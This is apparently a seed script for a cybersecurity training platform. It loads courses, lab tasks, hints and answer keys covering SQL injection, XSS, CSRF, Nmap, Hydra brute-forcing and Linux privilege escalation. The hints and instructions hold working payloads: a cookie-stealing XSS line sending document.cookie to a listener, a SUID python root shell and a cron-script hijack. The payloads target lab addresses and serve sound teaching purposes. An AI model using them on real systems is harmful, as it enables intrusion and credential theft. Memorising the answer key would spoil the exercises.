"""
seed_data.py — Populate the CyberArcade database with demo courses, labs, tasks, and hints.

Usage:
  1. Make sure the backend is running: uvicorn app.main:app --reload --port 8000
  2. Make sure you have at least one registered user
  3. Run:  python seed_data.py admin@email.com password123

  Replace admin@email.com and password123 with your admin user's credentials.
  The script will auto-promote the user to admin if needed.
"""

import sys
import requests

BASE = "http://127.0.0.1:8000"

# ─── Courses data ────────────────────────────────────────────────────
COURSES = [
    {
        "title": "Web Application Security",
        "description": "Master the most common web vulnerabilities including SQL injection, XSS, CSRF, and authentication bypass techniques. Learn to think like an attacker to build stronger defenses.",
        "difficulty_level": "beginner",
        "category": "Web Security",
        "estimated_hours": 6,
        "labs": [
            {
                "title": "SQL Injection Fundamentals",
                "description": "Learn how attackers manipulate SQL queries to bypass authentication and extract sensitive data from databases.",
                "difficulty": "beginner",
                "max_duration_minutes": 45,
                "has_auto_solve": True,
                "sort_order": 0,
                "tasks": [
                    {
                        "title": "Authentication Bypass",
                        "instructions": "The target web application has a login form vulnerable to SQL injection. Your goal is to bypass the authentication by crafting a malicious input that always evaluates to TRUE.\n\nTarget: http://10.10.14.5/login\n\nHint: Think about how the SQL query handles the username and password fields. What happens if you inject a condition that is always true?\n\nSubmit the exact payload you used in the username field.",
                        "expected_answer": "' OR '1'='1",
                        "sort_order": 0,
                        "hints": [
                            {"hint_text": "SQL queries often look like: SELECT * FROM users WHERE username='INPUT' AND password='INPUT'. What if you could close the quote early?", "hint_order": 1, "delay_minutes": 3},
                            {"hint_text": "Try injecting a single quote followed by OR and a condition that is always true. Don't forget to match the closing quote.", "hint_order": 2, "delay_minutes": 5},
                            {"hint_text": "The payload is: ' OR '1'='1  — this makes the WHERE clause always true.", "hint_order": 3, "delay_minutes": 8},
                        ],
                    },
                    {
                        "title": "Database Enumeration",
                        "instructions": "Now that you can inject SQL, extract the database version from the target.\n\nUse a UNION-based SQL injection to retrieve the version string from the database.\n\nSubmit the SQL function name used to get the database version.",
                        "expected_answer": "version()",
                        "sort_order": 1,
                        "hints": [
                            {"hint_text": "You can use UNION SELECT to append your own query results to the original query.", "hint_order": 1, "delay_minutes": 3},
                            {"hint_text": "In MySQL, the function to get the version is VERSION(). In PostgreSQL, it's version().", "hint_order": 2, "delay_minutes": 5},
                        ],
                    },
                    {
                        "title": "Data Extraction",
                        "instructions": "Extract the admin password hash from the users table.\n\nUse your UNION-based injection to query the users table and find the admin account's password hash.\n\nSubmit the first 8 characters of the admin password hash.",
                        "expected_answer": "5f4dcc3b",
                        "sort_order": 2,
                        "hints": [
                            {"hint_text": "First, enumerate the table names using information_schema.tables.", "hint_order": 1, "delay_minutes": 4},
                            {"hint_text": "Then query: UNION SELECT password FROM users WHERE username='admin'", "hint_order": 2, "delay_minutes": 6},
                        ],
                    },
                ],
            },
            {
                "title": "Cross-Site Scripting (XSS)",
                "description": "Discover and exploit XSS vulnerabilities to steal session cookies, deface pages, and understand how client-side attacks work.",
                "difficulty": "beginner",
                "max_duration_minutes": 40,
                "has_auto_solve": True,
                "sort_order": 1,
                "tasks": [
                    {
                        "title": "Reflected XSS",
                        "instructions": "The search feature on the target website reflects user input without sanitization.\n\nTarget: http://10.10.14.5/search\n\nCraft a payload that triggers a JavaScript alert box showing 'XSS'.\n\nSubmit the exact payload.",
                        "expected_answer": "<script>alert('XSS')</script>",
                        "sort_order": 0,
                        "hints": [
                            {"hint_text": "The search term is reflected in the HTML response. What if the search term contained HTML tags?", "hint_order": 1, "delay_minutes": 3},
                            {"hint_text": "Try injecting <script> tags with JavaScript code inside.", "hint_order": 2, "delay_minutes": 5},
                        ],
                    },
                    {
                        "title": "Cookie Theft via XSS",
                        "instructions": "Now use XSS to steal the admin's session cookie.\n\nCraft a payload that sends document.cookie to your listener at http://10.10.14.2:4444.\n\nWhat JavaScript object contains the cookies?",
                        "expected_answer": "document.cookie",
                        "sort_order": 1,
                        "hints": [
                            {"hint_text": "Use document.cookie to access cookies, and new Image().src or fetch() to exfiltrate them.", "hint_order": 1, "delay_minutes": 3},
                            {"hint_text": "Payload: <script>new Image().src='http://10.10.14.2:4444/?c='+document.cookie</script>", "hint_order": 2, "delay_minutes": 6},
                        ],
                    },
                ],
            },
            {
                "title": "CSRF & Session Attacks",
                "description": "Learn how Cross-Site Request Forgery works and practice crafting malicious pages that perform actions on behalf of authenticated users.",
                "difficulty": "intermediate",
                "max_duration_minutes": 50,
                "has_auto_solve": False,
                "sort_order": 2,
                "tasks": [
                    {
                        "title": "Craft a CSRF Attack",
                        "instructions": "The target app's password change feature at /change-password does not validate the Origin header or use CSRF tokens.\n\nCreate an HTML page that, when visited by an admin, changes their password to 'hacked123'.\n\nWhat HTTP method does the password change form use?",
                        "expected_answer": "POST",
                        "sort_order": 0,
                        "hints": [
                            {"hint_text": "CSRF attacks work by submitting forms from an attacker-controlled page to the victim's authenticated session.", "hint_order": 1, "delay_minutes": 4},
                            {"hint_text": "Use an auto-submitting form: <form method='POST' action='...'><input type='hidden' ...></form><script>document.forms[0].submit()</script>", "hint_order": 2, "delay_minutes": 7},
                        ],
                    },
                ],
            },
        ],
    },
    {
        "title": "Network Penetration Testing",
        "description": "Learn systematic network reconnaissance, service enumeration, and exploitation techniques used by professional penetration testers and red teamers.",
        "difficulty_level": "intermediate",
        "category": "Network Security",
        "estimated_hours": 8,
        "labs": [
            {
                "title": "Network Reconnaissance with Nmap",
                "description": "Master the industry-standard network scanner. Learn to discover hosts, enumerate open ports, identify services, and detect operating systems.",
                "difficulty": "beginner",
                "max_duration_minutes": 35,
                "has_auto_solve": True,
                "sort_order": 0,
                "tasks": [
                    {
                        "title": "Port Discovery",
                        "instructions": "Scan the target machine at 10.10.14.5 and identify all open TCP ports.\n\nUse nmap with the -sV flag for version detection.\n\n```bash\nnmap -sV 10.10.14.5\n```\n\nHow many open ports did you find?",
                        "expected_answer": "3",
                        "sort_order": 0,
                        "hints": [
                            {"hint_text": "Run: nmap -sV 10.10.14.5 and count the ports listed as 'open'.", "hint_order": 1, "delay_minutes": 2},
                            {"hint_text": "The open ports are: 22 (SSH), 80 (HTTP), and 443 (HTTPS).", "hint_order": 2, "delay_minutes": 4},
                        ],
                    },
                    {
                        "title": "Service Identification",
                        "instructions": "Identify the exact version of the SSH service running on port 22.\n\nUse nmap's version detection (-sV) or aggressive scan (-A).\n\nSubmit the SSH version string (e.g., OpenSSH X.Y).",
                        "expected_answer": "OpenSSH 8.9",
                        "sort_order": 1,
                        "hints": [
                            {"hint_text": "Run: nmap -sV -p22 10.10.14.5", "hint_order": 1, "delay_minutes": 2},
                            {"hint_text": "Look at the VERSION column in the nmap output for port 22.", "hint_order": 2, "delay_minutes": 4},
                        ],
                    },
                    {
                        "title": "OS Detection",
                        "instructions": "Determine the operating system of the target machine.\n\nUse nmap's OS detection feature.\n\n```bash\nnmap -O 10.10.14.5\n```\n\nWhat OS family is the target running? (Linux/Windows)",
                        "expected_answer": "Linux",
                        "sort_order": 2,
                        "hints": [
                            {"hint_text": "The -O flag enables OS detection. You may need sudo/root privileges.", "hint_order": 1, "delay_minutes": 3},
                        ],
                    },
                ],
            },
            {
                "title": "SSH Brute Force Attack",
                "description": "Learn password guessing techniques using Hydra. Understand the importance of strong passwords and how attackers exploit weak credentials.",
                "difficulty": "intermediate",
                "max_duration_minutes": 30,
                "has_auto_solve": True,
                "sort_order": 1,
                "tasks": [
                    {
                        "title": "Dictionary Attack",
                        "instructions": "Use Hydra to brute-force the SSH login on 10.10.14.5.\n\nA wordlist is provided at /usr/share/wordlists/rockyou.txt.\nThe username is 'admin'.\n\n```bash\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.14.5\n```\n\nWhat is the admin's password?",
                        "expected_answer": "password123",
                        "sort_order": 0,
                        "hints": [
                            {"hint_text": "Hydra will try each password from the wordlist. Watch for a line showing [22][ssh] host: 10.10.14.5 login: admin password: ???", "hint_order": 1, "delay_minutes": 3},
                            {"hint_text": "The password is one of the most common passwords in the rockyou.txt wordlist.", "hint_order": 2, "delay_minutes": 5},
                        ],
                    },
                    {
                        "title": "Post-Exploitation",
                        "instructions": "Now that you have SSH access, log in and find the flag file.\n\n```bash\nssh admin@10.10.14.5\nfind / -name 'flag.txt' 2>/dev/null\ncat /home/admin/flag.txt\n```\n\nSubmit the flag contents.",
                        "expected_answer": "CTF{ssh_brut3_f0rc3_succ3ss}",
                        "sort_order": 1,
                        "hints": [
                            {"hint_text": "Use the 'find' command to search for flag.txt across the filesystem.", "hint_order": 1, "delay_minutes": 3},
                            {"hint_text": "The flag is located at /home/admin/flag.txt", "hint_order": 2, "delay_minutes": 5},
                        ],
                    },
                ],
            },
            {
                "title": "Wireshark Traffic Analysis",
                "description": "Analyze network packet captures to detect attacks, extract credentials, and reconstruct communication flows.",
                "difficulty": "intermediate",
                "max_duration_minutes": 45,
                "has_auto_solve": False,
                "sort_order": 2,
                "tasks": [
                    {
                        "title": "Credential Sniffing",
                        "instructions": "Open the provided PCAP file in Wireshark and analyze the captured HTTP traffic.\n\nFilter for HTTP POST requests to find transmitted login credentials.\n\nWhat Wireshark display filter shows only HTTP POST requests?",
                        "expected_answer": "http.request.method == POST",
                        "sort_order": 0,
                        "hints": [
                            {"hint_text": "Wireshark display filters use field names like http.request.method.", "hint_order": 1, "delay_minutes": 3},
                            {"hint_text": "The filter syntax uses == for equality comparison.", "hint_order": 2, "delay_minutes": 5},
                        ],
                    },
                ],
            },
        ],
    },
    {
        "title": "Linux Privilege Escalation",
        "description": "Learn to escalate from a low-privilege shell to root access on Linux systems. Cover SUID binaries, cron jobs, kernel exploits, and misconfigured services.",
        "difficulty_level": "advanced",
        "category": "Red Team",
        "estimated_hours": 10,
        "labs": [
            {
                "title": "SUID Binary Exploitation",
                "description": "Discover and exploit SUID binaries that can be abused to escalate privileges to root on a Linux target.",
                "difficulty": "advanced",
                "max_duration_minutes": 60,
                "has_auto_solve": True,
                "sort_order": 0,
                "tasks": [
                    {
                        "title": "Find SUID Binaries",
                        "instructions": "You have a low-privilege shell on the target. Find all SUID binaries on the system.\n\n```bash\nfind / -perm -4000 -type f 2>/dev/null\n```\n\nWhat command-line flag in 'find' searches for SUID permissions?",
                        "expected_answer": "-perm -4000",
                        "sort_order": 0,
                        "hints": [
                            {"hint_text": "SUID files have the setuid bit set, which is represented as 4000 in octal permissions.", "hint_order": 1, "delay_minutes": 3},
                            {"hint_text": "Use find with -perm flag. The dash before 4000 means 'at least these permissions'.", "hint_order": 2, "delay_minutes": 5},
                        ],
                    },
                    {
                        "title": "Exploit the Binary",
                        "instructions": "The /usr/bin/python3 binary has the SUID bit set (owned by root).\n\nUse it to spawn a root shell.\n\n```bash\n/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'  \n```\n\nWhat Python function is used to change the effective user ID to root?",
                        "expected_answer": "os.setuid",
                        "sort_order": 1,
                        "hints": [
                            {"hint_text": "When a SUID binary runs as root, you can use it to change your effective user ID.", "hint_order": 1, "delay_minutes": 4},
                            {"hint_text": "The os module in Python has setuid() and system() functions. setuid(0) = become root.", "hint_order": 2, "delay_minutes": 6},
                        ],
                    },
                    {
                        "title": "Capture the Root Flag",
                        "instructions": "Now that you have root access, read the flag file.\n\n```bash\ncat /root/flag.txt\n```\n\nSubmit the flag.",
                        "expected_answer": "CTF{su1d_pr1v3sc_r00t3d}",
                        "sort_order": 2,
                        "hints": [
                            {"hint_text": "Root flags are typically stored in /root/.", "hint_order": 1, "delay_minutes": 2},
                        ],
                    },
                ],
            },
            {
                "title": "Cron Job Hijacking",
                "description": "Exploit misconfigured cron jobs to achieve privilege escalation by modifying scripts that run as root.",
                "difficulty": "advanced",
                "max_duration_minutes": 50,
                "has_auto_solve": True,
                "sort_order": 1,
                "tasks": [
                    {
                        "title": "Discover Cron Jobs",
                        "instructions": "Enumerate the system's scheduled cron jobs to find one running as root.\n\n```bash\ncat /etc/crontab\nls -la /etc/cron.d/\n```\n\nWhat file contains system-wide cron job definitions?",
                        "expected_answer": "/etc/crontab",
                        "sort_order": 0,
                        "hints": [
                            {"hint_text": "System-wide cron jobs are defined in /etc/crontab and files within /etc/cron.d/.", "hint_order": 1, "delay_minutes": 3},
                        ],
                    },
                    {
                        "title": "Hijack the Script",
                        "instructions": "A cron job runs /opt/backup.sh as root every minute, and the file is world-writable.\n\nModify the script to add a reverse shell or create a root SUID shell.\n\n```bash\necho 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/backup.sh\n```\n\nAfter 1 minute, run: /tmp/rootbash -p\n\nWhat flag makes bash preserve the SUID effective UID?",
                        "expected_answer": "-p",
                        "sort_order": 1,
                        "hints": [
                            {"hint_text": "Bash drops privileges by default. The -p flag tells it to keep the effective UID.", "hint_order": 1, "delay_minutes": 4},
                        ],
                    },
                ],
            },
        ],
    },
]


def main():
    if len(sys.argv) < 3:
        print("Usage: python seed_data.py <admin_email> <password>")
        print("Example: python seed_data.py admin@test.com password123")
        sys.exit(1)

    email = sys.argv[1]
    password = sys.argv[2]

    # ── Login ──
    print(f"\n🔐 Logging in as {email}...")
    r = requests.post(f"{BASE}/api/auth/login", json={"email": email, "password": password})
    if r.status_code != 200:
        print(f"   ❌ Login failed: {r.text}")
        sys.exit(1)

    tokens = r.json()
    headers = {"Authorization": f"Bearer {tokens['access_token']}"}
    print("   ✅ Logged in successfully")

    # ── Create courses, labs, tasks, hints ──
    total_courses = 0
    total_labs = 0
    total_tasks = 0
    total_hints = 0

    for course_data in COURSES:
        labs_data = course_data.pop("labs", [])

        print(f"\n📘 Creating course: {course_data['title']}...")
        r = requests.post(f"{BASE}/api/courses", json=course_data, headers=headers)
        if r.status_code not in (200, 201):
            print(f"   ❌ Failed: {r.text}")
            continue

        course = r.json()
        course_id = course["course_id"]
        total_courses += 1
        print(f"   ✅ Created (ID: {course_id})")

        # Publish the course
        r = requests.put(f"{BASE}/api/courses/{course_id}", json={"is_published": True}, headers=headers)
        if r.status_code == 200:
            print("   ✅ Published")

        for lab_data in labs_data:
            tasks_data = lab_data.pop("tasks", [])

            lab_payload = {
                "course_id": course_id,
                "title": lab_data["title"],
                "description": lab_data["description"],
                "difficulty": lab_data["difficulty"],
                "max_duration_minutes": lab_data["max_duration_minutes"],
                "has_auto_solve": lab_data.get("has_auto_solve", False),
                "sort_order": lab_data.get("sort_order", 0),
                "docker_compose_config": {
                    "version": "3",
                    "services": {
                        "attacker": {"image": "kalilinux/kali-rolling", "networks": ["lab-net"]},
                        "victim": {"image": "vulnerables/web-dvwa", "networks": ["lab-net"]},
                    },
                    "networks": {"lab-net": {"driver": "bridge"}},
                },
            }

            print(f"   🔬 Creating lab: {lab_data['title']}...")
            r = requests.post(f"{BASE}/api/labs", json=lab_payload, headers=headers)
            if r.status_code not in (200, 201):
                print(f"      ❌ Failed: {r.text}")
                continue

            lab = r.json()
            lab_id = lab["lab_id"]
            total_labs += 1
            print(f"      ✅ Created (ID: {lab_id})")

            for task_data in tasks_data:
                hints_data = task_data.pop("hints", [])

                print(f"      📝 Creating task: {task_data['title']}...")
                r = requests.post(f"{BASE}/api/labs/{lab_id}/tasks", json=task_data, headers=headers)
                if r.status_code not in (200, 201):
                    print(f"         ❌ Failed: {r.text}")
                    continue

                task = r.json()
                task_id = task["task_id"]
                total_tasks += 1
                print(f"         ✅ Created (ID: {task_id})")

                for hint_data in hints_data:
                    r = requests.post(
                        f"{BASE}/api/labs/{lab_id}/tasks/{task_id}/hints",
                        json=hint_data,
                        headers=headers,
                    )
                    if r.status_code in (200, 201):
                        total_hints += 1
                    else:
                        print(f"         ⚠️  Hint failed: {r.text}")

                if hints_data:
                    print(f"         💡 {len(hints_data)} hints added")

    print(f"\n{'='*50}")
    print(f"🎉 SEED COMPLETE!")
    print(f"   📘 Courses:  {total_courses}")
    print(f"   🔬 Labs:     {total_labs}")
    print(f"   📝 Tasks:    {total_tasks}")
    print(f"   💡 Hints:    {total_hints}")
    print(f"{'='*50}\n")


if __name__ == "__main__":
    main()
